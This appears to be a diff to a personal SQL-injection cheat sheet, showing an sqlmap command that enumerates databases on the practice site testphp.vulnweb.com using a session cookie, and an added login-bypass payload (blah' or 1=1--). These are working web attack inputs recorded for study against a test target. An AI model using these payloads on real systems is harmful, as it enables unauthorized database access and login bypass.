@@ -20,3 +20,7 @@ Reference = https://www.hackingarticles.in/database-penetration-testing-using-sq
 
 Using cookies
 sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --cookie='JSESSIONID=09h76qoWC559GH1K7DSQHx' --random-agent --level=1 --risk=3 --dbs --batch
+
+SQL Injection
+
+in login page enter blah' or 1=1-- as username and click login without entering the password
